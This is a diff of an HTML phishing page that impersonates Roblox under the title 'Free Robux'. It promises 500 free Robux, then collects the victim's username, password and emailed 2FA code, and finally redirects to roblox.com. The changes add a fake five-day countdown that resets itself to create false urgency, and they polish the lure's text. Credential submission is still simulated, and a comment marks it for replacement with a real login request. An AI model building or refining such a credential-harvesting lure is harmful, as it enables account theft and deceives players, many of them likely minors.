@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Événement Roblox</title>
+    <title>Roblox - Free Robux</title>
     <style>
         * {
             box-sizing: border-box;
@@ -14,7 +14,7 @@
         body {
             min-height: 100vh;
             background: #101113;
-            font-family: Arial, Helvetica, sans-serif;
+            font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -35,19 +35,19 @@
         }
 
         /* =========================
-           LOGO
+           LOGO ROBLOX
         ========================= */
         .logo {
             display: flex;
             align-items: center;
             gap: 7px;
-            margin-bottom: 12px;
+            margin-bottom: 20px;
             color: white;
             white-space: nowrap;
         }
 
         .logo-letter {
-            font-family: Arial Black, Arial, Helvetica, sans-serif;
+            font-family: 'Arial Black', Arial, Helvetica, sans-serif;
             font-size: 48px;
             line-height: 1;
             font-weight: 900;
@@ -100,7 +100,62 @@
         }
 
         /* =========================
-           ÉTAPE 1 : OFFRE (ENRICHIE)
+           COMPTE À REBOURS (5 jours)
+        ========================= */
+        .countdown-box {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid #292b2e;
+            border-radius: 16px;
+            padding: 18px 12px;
+            margin-bottom: 20px;
+        }
+
+        .countdown-box .label {
+            font-size: 12px;
+            color: #777b80;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .countdown-box .timer {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+        }
+
+        .countdown-box .timer .block {
+            text-align: center;
+        }
+
+        .countdown-box .timer .block .number {
+            font-size: 30px;
+            font-weight: 700;
+            color: #ffffff;
+            line-height: 1;
+            display: block;
+            min-width: 30px;
+        }
+
+        .countdown-box .timer .block .unit {
+            font-size: 10px;
+            color: #55585e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 4px;
+        }
+
+        .countdown-box .timer .separator {
+            font-size: 26px;
+            color: #2a2d30;
+            font-weight: 300;
+            padding-top: 4px;
+        }
+
+        /* =========================
+           ÉTAPE 1 : OFFRE
         ========================= */
         .offer-badge {
             display: inline-block;
@@ -131,15 +186,8 @@
             font-size: 18px;
             color: #777b80;
             text-align: center;
-            margin-bottom: 8px;
+            margin-bottom: 20px;
             line-height: 1.5;
-        }
-
-        .offer-cta-text {
-            font-size: 14px;
-            color: #777b80;
-            text-align: center;
-            margin-bottom: 24px;
         }
 
         .offer-box {
@@ -172,32 +220,6 @@
             margin-top: 6px;
         }
 
-        .offer-stats {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            margin-bottom: 20px;
-        }
-
-        .offer-stats .stat {
-            text-align: center;
-        }
-
-        .offer-stats .stat .number {
-            font-size: 20px;
-            font-weight: 700;
-            color: #ffffff;
-        }
-
-        .offer-stats .stat .number .highlight {
-            color: #00b878;
-        }
-
-        .offer-stats .stat .label {
-            font-size: 12px;
-            color: #777b80;
-        }
-
         .offer-footer {
             display: flex;
             justify-content: center;
@@ -205,7 +227,7 @@
             font-size: 12px;
             color: #55585e;
             text-align: center;
-            margin-top: 8px;
+            margin-top: 6px;
         }
 
         .offer-footer span {
@@ -219,21 +241,21 @@
         ========================= */
         .input-field {
             width: 100%;
-            height: 72px;
-            padding: 0 28px;
+            height: 64px;
+            padding: 0 24px;
             background: #0e1012;
             color: #ffffff;
             border: 2px solid #2a2d30;
-            border-radius: 18px;
+            border-radius: 16px;
             outline: none;
-            font-size: 20px;
-            font-family: Arial, Helvetica, sans-serif;
+            font-size: 18px;
+            font-family: 'Segoe UI', Arial, sans-serif;
             transition: border 0.2s;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
 
         .input-field::placeholder {
-            color: #777b80;
+            color: #55585e;
             opacity: 1;
         }
 
@@ -257,7 +279,7 @@
             transform: translateY(-50%);
             background: none;
             border: none;
-            color: #777b80;
+            color: #55585e;
             font-size: 20px;
             cursor: pointer;
             padding: 4px;
@@ -269,10 +291,15 @@
 
         .error-msg {
             color: #ff3b30;
-            font-size: 13px;
-            margin-top: -10px;
-            margin-bottom: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: -8px;
+            margin-bottom: 12px;
             display: none;
+            padding: 8px 16px;
+            background: rgba(255, 59, 48, 0.08);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 59, 48, 0.15);
         }
 
         /* =========================
@@ -280,17 +307,18 @@
         ========================= */
         .btn-primary {
             width: 100%;
-            height: 72px;
+            height: 64px;
             border: none;
-            border-radius: 18px;
+            border-radius: 16px;
             background: #00b878;
             color: #ffffff;
-            font-size: 22px;
-            font-weight: 700;
+            font-size: 20px;
+            font-weight: 600;
             cursor: pointer;
             transition: 0.2s ease;
-            font-family: Arial, Helvetica, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             margin-top: 4px;
+            letter-spacing: 0.3px;
         }
 
         .btn-primary:hover {
@@ -335,9 +363,9 @@
 
         .forgot-links {
             text-align: center;
-            margin-top: 18px;
+            margin-top: 16px;
             font-size: 14px;
-            color: #777b80;
+            color: #55585e;
         }
 
         .forgot-links a {
@@ -356,41 +384,43 @@
         }
 
         /* =========================
-           ÉTAPE 2 : CONNEXION (ENRICHIE)
+           ÉTAPE 2 : CONNEXION
         ========================= */
-        .login-welcome {
+        .login-header {
             text-align: center;
-            font-size: 14px;
-            color: #777b80;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
         }
 
-        .login-welcome strong {
+        .login-header .welcome {
+            font-size: 14px;
+            color: #55585e;
+        }
+
+        .login-header .welcome strong {
             color: #ffffff;
         }
 
-        .login-sub {
-            text-align: center;
-            font-size: 16px;
+        .login-header .sub {
+            font-size: 17px;
             color: #777b80;
-            margin-bottom: 24px;
+            margin-top: 2px;
         }
 
         /* =========================
-           ÉTAPE 3 : 2FA (ENRICHIE)
+           ÉTAPE 3 : 2FA
         ========================= */
         .verification-info {
             text-align: center;
             font-size: 18px;
             color: #777b80;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
         }
 
         .verification-sub {
             text-align: center;
             font-size: 14px;
             color: #55585e;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .verification-sub strong {
@@ -406,11 +436,11 @@
 
         .code-input-group input {
             width: 60px;
-            height: 72px;
+            height: 68px;
             text-align: center;
             font-size: 26px;
             font-weight: 600;
-            font-family: Arial, Helvetica, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             background: #0e1012;
             color: #ffffff;
             border: 2px solid #2a2d30;
@@ -430,12 +460,16 @@
             text-align: center;
             display: none;
             margin-bottom: 12px;
+            padding: 8px 16px;
+            background: rgba(255, 59, 48, 0.08);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 59, 48, 0.15);
         }
 
         .resend-link {
             text-align: center;
             font-size: 14px;
-            color: #777b80;
+            color: #55585e;
             margin-bottom: 16px;
         }
 
@@ -460,7 +494,7 @@
             }
             .logo {
                 gap: 5px;
-                margin-bottom: 12px;
+                margin-bottom: 16px;
             }
             .logo-letter {
                 font-size: 38px;
@@ -483,51 +517,44 @@
             .offer-box .big-title {
                 font-size: 22px;
             }
-            .offer-stats {
-                gap: 16px;
-                flex-wrap: wrap;
-            }
-            .offer-stats .stat .number {
-                font-size: 17px;
-            }
             .offer-footer {
                 flex-wrap: wrap;
                 gap: 8px;
             }
             .input-field {
-                height: 60px;
-                font-size: 17px;
-                padding: 0 20px;
+                height: 56px;
+                font-size: 16px;
+                padding: 0 18px;
                 border-radius: 14px;
             }
             .btn-primary {
-                height: 60px;
+                height: 56px;
                 font-size: 18px;
                 border-radius: 14px;
             }
             .code-input-group input {
                 width: 48px;
-                height: 58px;
+                height: 56px;
                 font-size: 20px;
             }
-            .login-sub {
-                font-size: 14px;
+            .countdown-box .timer .block .number {
+                font-size: 24px;
             }
-            .verification-info {
-                font-size: 16px;
+            .login-header .sub {
+                font-size: 15px;
             }
         }
 
         @media (max-width: 380px) {
             .card {
-                padding: 24px 14px 28px;
+                padding: 20px 14px 24px;
             }
             .logo-letter {
-                font-size: 32px;
+                font-size: 30px;
             }
             .roblox-square {
-                width: 20px;
-                height: 20px;
+                width: 18px;
+                height: 18px;
             }
             .roblox-square::after {
                 width: 6px;
@@ -540,13 +567,13 @@
                 font-size: 13px;
             }
             .input-field {
-                height: 52px;
-                font-size: 15px;
-                padding: 0 16px;
+                height: 48px;
+                font-size: 14px;
+                padding: 0 14px;
                 border-radius: 12px;
             }
             .btn-primary {
-                height: 52px;
+                height: 48px;
                 font-size: 16px;
                 border-radius: 12px;
             }
@@ -557,6 +584,12 @@
             }
             .code-input-group {
                 gap: 8px;
+            }
+            .countdown-box .timer .block .number {
+                font-size: 20px;
+            }
+            .countdown-box .timer .separator {
+                font-size: 18px;
             }
         }
     </style>
@@ -576,36 +609,44 @@
         </div>
 
         <!-- ============================================================
-        ÉTAPE 1 : OFFRE (ENRICHIE)
+        ÉTAPE 1 : OFFRE AVEC COMPTE À REBOURS
         ============================================================ -->
         <div id="step1" class="step active">
             <div style="text-align:center;">
                 <span class="offer-badge">🔥 Offre limitée</span>
             </div>
+
+            <div class="countdown-box">
+                <div class="label">⏳ Temps restant avant la fin de l'offre</div>
+                <div class="timer" id="countdownTimer">
+                    <div class="block">
+                        <span class="number" id="days">05</span>
+                        <span class="unit">Jours</span>
+                    </div>
+                    <span class="separator">:</span>
+                    <div class="block">
+                        <span class="number" id="hours">00</span>
+                        <span class="unit">Heures</span>
+                    </div>
+                    <span class="separator">:</span>
+                    <div class="block">
+                        <span class="number" id="minutes">00</span>
+                        <span class="unit">Minutes</span>
+                    </div>
+                    <span class="separator">:</span>
+                    <div class="block">
+                        <span class="number" id="seconds">00</span>
+                        <span class="unit">Secondes</span>
+                    </div>
+                </div>
+            </div>
+
             <div class="offer-title">
                 🎁 <span class="highlight">500 Robux</span> gratuits
             </div>
             <p class="offer-subtitle">
-                Pour un temps limité, Roblox offre 500 Robux aux joueurs actifs.
+                Profite de cette offre exclusive réservée aux joueurs Roblox.
             </p>
-            <p class="offer-cta-text">
-                Ne laisse pas passer cette chance — réclame les tiens maintenant !
-            </p>
-
-            <div class="offer-stats">
-                <div class="stat">
-                    <div class="number"><span class="highlight">500</span></div>
-                    <div class="label">Robux offerts</div>
-                </div>
-                <div class="stat">
-                    <div class="number">10 000</div>
-                    <div class="label">Places totales</div>
-                </div>
-                <div class="stat">
-                    <div class="number"><span class="highlight">7 843</span></div>
-                    <div class="label">Restantes</div>
-                </div>
-            </div>
 
             <div class="offer-box">
                 <div class="big-icon">🎁</div>
@@ -623,21 +664,19 @@
 
             <div class="offer-footer">
                 <span>🔒 Aucune carte bancaire</span>
-                <span>⏳ Offre valable 24h</span>
                 <span>✅ 100% gratuit</span>
+                <span>🎯 Réservé aux joueurs</span>
             </div>
         </div>
 
         <!-- ============================================================
-        ÉTAPE 2 : CONNEXION (ENRICHIE)
+        ÉTAPE 2 : CONNEXION (SÉRIEUSE)
         ============================================================ -->
         <div id="step2" class="step">
-            <div class="login-welcome">
-                Bienvenue dans le <strong>Partners Program</strong>
+            <div class="login-header">
+                <div class="welcome">Bienvenue dans le <strong>Partners Program</strong></div>
+                <div class="sub">Enter your Roblox username to start getting free Robux</div>
             </div>
-            <p class="login-sub">
-                Enter your Roblox username to start getting free Robux
-            </p>
 
             <form id="loginForm">
                 <input
@@ -661,7 +700,8 @@
                         <i id="eyeIcon" style="font-style:normal;">👁️</i>
                     </button>
                 </div>
-                <div class="error-msg" id="loginError">Veuillez remplir tous les champs.</div>
+
+                <div class="error-msg" id="loginError">Veuillez entrer un nom d'utilisateur et un mot de passe.</div>
 
                 <button type="submit" class="btn-primary" id="step2Btn">
                     <span class="btn-content">
@@ -679,14 +719,14 @@
         </div>
 
         <!-- ============================================================
-        ÉTAPE 3 : 2FA (ENRICHIE)
+        ÉTAPE 3 : 2FA
         ============================================================ -->
         <div id="step3" class="step">
             <div class="verification-info">
                 📧 Un code de vérification vous a été envoyé.
             </div>
             <div class="verification-sub">
-                Vérifiez votre boîte mail (et vos spams) — le code expire dans <strong>5 minutes</strong>.
+                Vérifiez votre boîte mail — le code expire dans <strong>5 minutes</strong>.
             </div>
 
             <div class="code-input-group" id="codeInputs">
@@ -715,11 +755,53 @@
 
     <script>
         // ============================================================
-        // BOUTON OFFRE → ÉTAPE 2
+        // COMPTE À REBOURS PERSISTANT (5 jours)
         // ============================================================
-        document.getElementById('btnOffer').addEventListener('click', function() {
-            goToStep(2);
-        });
+        function startPersistentCountdown() {
+            let endDateStr = localStorage.getItem('roblox_countdown_end');
+            let endDate;
+
+            if (endDateStr) {
+                endDate = new Date(endDateStr);
+                if (endDate <= new Date()) {
+                    endDate = new Date();
+                    endDate.setDate(endDate.getDate() + 5);
+                    endDate.setHours(23, 59, 59, 999);
+                    localStorage.setItem('roblox_countdown_end', endDate.toISOString());
+                }
+            } else {
+                endDate = new Date();
+                endDate.setDate(endDate.getDate() + 5);
+                endDate.setHours(23, 59, 59, 999);
+                localStorage.setItem('roblox_countdown_end', endDate.toISOString());
+            }
+
+            function updateCountdown() {
+                const now = new Date();
+                const diff = endDate - now;
+
+                if (diff <= 0) {
+                    document.getElementById('days').textContent = '00';
+                    document.getElementById('hours').textContent = '00';
+                    document.getElementById('minutes').textContent = '00';
+                    document.getElementById('seconds').textContent = '00';
+                    return;
+                }
+
+                const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+                document.getElementById('days').textContent = String(days).padStart(2, '0');
+                document.getElementById('hours').textContent = String(hours).padStart(2, '0');
+                document.getElementById('minutes').textContent = String(minutes).padStart(2, '0');
+                document.getElementById('seconds').textContent = String(seconds).padStart(2, '0');
+            }
+
+            updateCountdown();
+            setInterval(updateCountdown, 1000);
+        }
 
         // ============================================================
         // GESTION DES ÉTAPES
@@ -728,6 +810,14 @@
             document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
             document.getElementById('step' + stepNumber).classList.add('active');
         }
+
+        // ============================================================
+        // BOUTON OFFRE → ÉTAPE 2
+        // ============================================================
+        document.getElementById('btnOffer').addEventListener('click', function() {
+            goToStep(2);
+            document.getElementById('username').focus();
+        });
 
         // ============================================================
         // TOGGLE PASSWORD
@@ -769,16 +859,13 @@
             btnText.textContent = 'Envoi...';
             spinner.style.display = 'block';
 
-            // Simuler envoi (à remplacer par fetch)
+            // Simuler envoi (à remplacer par fetch('/api/login', ...))
             setTimeout(() => {
                 btn.disabled = false;
                 btnText.textContent = 'Continue';
                 spinner.style.display = 'none';
 
-                // Passer à l'étape 3
                 goToStep(3);
-
-                // Réinitialiser les champs de code
                 document.querySelectorAll('.code-input').forEach(inp => inp.value = '');
                 document.getElementById('codeError').style.display = 'none';
                 document.querySelector('.code-input').focus();
@@ -848,6 +935,11 @@
                 window.location.href = 'https://www.roblox.com';
             }, 1500);
         });
+
+        // ============================================================
+        // LANCER LE COMPTE À REBOURS
+        // ============================================================
+        startPersistentCountdown();
     </script>
 
 </body>
